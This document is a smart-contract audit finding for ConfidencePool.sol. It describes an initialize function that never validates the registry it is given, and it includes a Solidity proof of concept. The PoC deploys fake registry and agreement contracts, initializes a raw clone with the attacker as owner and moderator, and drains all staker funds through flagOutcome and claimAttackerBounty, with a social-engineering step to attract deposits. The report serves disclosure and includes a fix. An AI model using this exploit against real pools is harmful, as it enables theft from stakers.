### Title
Unvalidated `safeHarborRegistry_` in `initialize` allows attacker to deploy a malicious pool with a fake registry, enabling theft of all staker funds - (File: src/ConfidencePool.sol)

### Summary
`ConfidencePool.initialize` accepts a caller-supplied `safeHarborRegistry_` and validates the agreement against it, but never verifies that `safeHarborRegistry_` is the canonical protocol registry. Because `initialize` is `external` and any actor can create a raw clone of the implementation, an attacker can call `initialize` directly with a malicious registry that approves any agreement, set themselves as both owner and moderator, attract stakers, and drain the entire pool via the good-faith CORRUPTED path.

### Finding Description
The agreement-validity guard in `initialize` reads:

```solidity
if (!IBattleChainSafeHarborRegistry(safeHarborRegistry_).isAgreementValid(agreement_)) {
    revert InvalidAgreement();
}
```

`safeHarborRegistry_` is a free parameter supplied by the caller. The factory always passes `address(safeHarborRegistry)` (its own trusted registry), but `initialize` is `external initializer` and imposes no restriction on who calls it or what registry address is supplied. OpenZeppelin's `Clones` library is public; anyone can call `Clones.clone(poolImplementation)` to obtain an uninitialized clone and then call `initialize` on it with arbitrary arguments.

The factory's `createPool` enforces the canonical registry and the `allowedStakeToken` allowlist, but those guards live only in the factory. They are not re-enforced inside `initialize`, so a clone created outside the factory bypasses them entirely.

The checks that `initialize` does perform — `agreement_ != address(0)`, `safeHarborRegistry_ != address(0)`, and `isAgreementValid` — are all satisfied by a trivially-written malicious registry that returns `true` for every call. The `_replaceScope` call inside `initialize` similarly delegates to `IAgreement(agreement_).isContractInScope(account)`, which a malicious agreement contract can also return `true` for unconditionally.

### Impact Explanation
An attacker who controls both the pool owner and the `outcomeModerator` slot (both set freely in `initialize`) can:

1. Wait for stakers to deposit.
2. Call `flagOutcome(PoolStates.Outcome.CORRUPTED, true, attacker_address)` as the moderator. The `_observePoolState()` call inside `flagOutcome` reads `safeHarborRegistry.getAttackRegistry()` and then `getAgreementState(agreement)` — both delegated to the attacker's malicious contracts, which return `IAttackRegistry.ContractState.CORRUPTED`.
3. Call `claimAttackerBounty()` as the named attacker. `bountyEntitlement` was set to `snapshotTotalStaked + snapshotTotalBonus` — the entire pool — at flag time.

All staker principal and bonus are transferred to the attacker in step 3. No guard in the claim path re-validates the registry.

### Likelihood Explanation
Creating a raw clone and calling `initialize` requires no special privilege — only knowledge of the deployed `poolImplementation` address (publicly emitted by the factory). The attacker must attract stakers to a pool not listed in the factory's `_poolsByAgreement` mapping, which requires some social engineering (e.g., advertising a pool address directly, or exploiting off-chain UIs that do not verify factory provenance). Stakers who do not independently verify `pool.safeHarborRegistry()` against the canonical address are at risk. The technical barrier is low; the social barrier is moderate.

### Recommendation
Add a factory-address check to `initialize`. The simplest approach is to record the deploying factory at construction time (or pass it as an immutable) and require `msg.sender == factory` inside `initialize`. Alternatively, hardcode the canonical `safeHarborRegistry` address as an immutable in the implementation contract and reject any `safeHarborRegistry_` that does not match it, mirroring the pattern the external report recommends (verify the validator, not just the payload).

### Proof of Concept

```solidity
// Attacker deploys:
contract FakeRegistry {
    function isAgreementValid(address) external pure returns (bool) { return true; }
    function getAttackRegistry() external view returns (address) { return address(new FakeAttackRegistry()); }
}
contract FakeAttackRegistry {
    function getAgreementState(address) external pure returns (uint8) {
        return uint8(IAttackRegistry.ContractState.CORRUPTED); // terminal state
    }
}
contract FakeAgreement {
    address public owner;
    constructor() { owner = msg.sender; }
    function isContractInScope(address) external pure returns (bool) { return true; }
}

// Attack sequence:
address clone = Clones.clone(poolImplementation);          // step 1: raw clone, no factory
FakeRegistry reg = new FakeRegistry();
FakeAgreement agr = new FakeAgreement();

IConfidencePool(clone).initialize(
    address(agr),          // agreement_       — fake, passes isAgreementValid
    allowedToken,          // stakeToken_      — any real ERC20
    address(reg),          // safeHarborRegistry_ — FAKE, never validated
    address(this),         // outcomeModerator_ — attacker is moderator
    block.timestamp + 31 days,
    1,
    address(this),         // recoveryAddress_
    address(this),         // owner_
    scopeAccounts
);

// Stakers deposit into the clone (social engineering / UI exploit).

// Attacker flags good-faith CORRUPTED — fake registry returns CORRUPTED.
IConfidencePool(clone).flagOutcome(PoolStates.Outcome.CORRUPTED, true, address(this));

// Attacker drains the entire pool.
IConfidencePool(clone).claimAttackerBounty();
```

The `isAgreementValid` guard at [1](#0-0)  is the only check that could reject a malicious registry, but it calls into the attacker-supplied `safeHarborRegistry_` rather than a canonical address, so it is trivially bypassed. The factory enforces the canonical registry at [2](#0-1)  but `initialize` is `external` and reachable independently of the factory. [3](#0-2)  The `flagOutcome` path re-reads state from `safeHarborRegistry` without re-validating it, so the malicious registry controls the outcome. [4](#0-3)  The `claimAttackerBounty` payout is `bountyEntitlement = snapshotTotalStaked + snapshotTotalBonus`, the full pool. [5](#0-4)

### Citations

**File:** src/ConfidencePool.sol (L179-219)
```text
    function initialize(
        address agreement_,
        address stakeToken_,
        address safeHarborRegistry_,
        address outcomeModerator_,
        uint256 expiry_,
        uint256 minStake_,
        address recoveryAddress_,
        address owner_,
        address[] calldata accounts
    ) external initializer {
        if (agreement_ == address(0)) revert ZeroAddress();
        if (stakeToken_ == address(0)) revert ZeroAddress();
        if (safeHarborRegistry_ == address(0)) revert ZeroAddress();
        if (outcomeModerator_ == address(0)) revert ZeroAddress();
        if (owner_ == address(0)) revert ZeroAddress();
        if (recoveryAddress_ == address(0)) revert InvalidRecoveryAddress();
        if (expiry_ < block.timestamp + _MIN_EXPIRY_LEAD) revert ExpiryTooSoon();
        if (expiry_ > type(uint32).max) revert ExpiryTooFar();
        if (minStake_ == 0) revert InvalidAmount();
        // aderyn-fp-next-line(reentrancy-state-change)
        if (!IBattleChainSafeHarborRegistry(safeHarborRegistry_).isAgreementValid(agreement_)) {
            revert InvalidAgreement();
        }

        agreement = agreement_;
        stakeToken = IERC20(stakeToken_);
        safeHarborRegistry = IBattleChainSafeHarborRegistry(safeHarborRegistry_);
        outcomeModerator = outcomeModerator_;
        // forge-lint: disable-next-line(unsafe-typecast)
        expiry = uint32(expiry_);
        minStake = minStake_;
        recoveryAddress = recoveryAddress_;
        outcome = PoolStates.Outcome.UNRESOLVED;

        _replaceScope(accounts);

        // Direct assignment (skipping Ownable2Step's two-step) so no `owner() == initializer-caller`
        // window exists between init and the new owner accepting. Two-step still applies to later transfers.
        _transferOwnership(owner_);
    }
```

**File:** src/ConfidencePool.sol (L362-362)
```text
        bountyEntitlement = willBeGoodFaithCorrupted ? snapshotTotalStaked + snapshotTotalBonus : 0;
```

**File:** src/ConfidencePool.sol (L740-744)
```text
    function _getAgreementState() internal view returns (IAttackRegistry.ContractState) {
        address attackRegistry = safeHarborRegistry.getAttackRegistry();
        if (attackRegistry == address(0)) revert InvalidAgreement();
        return IAttackRegistry(attackRegistry).getAgreementState(agreement);
    }
```

**File:** src/ConfidencePoolFactory.sol (L80-80)
```text
        if (!safeHarborRegistry.isAgreementValid(agreement)) revert InvalidAgreement();
```
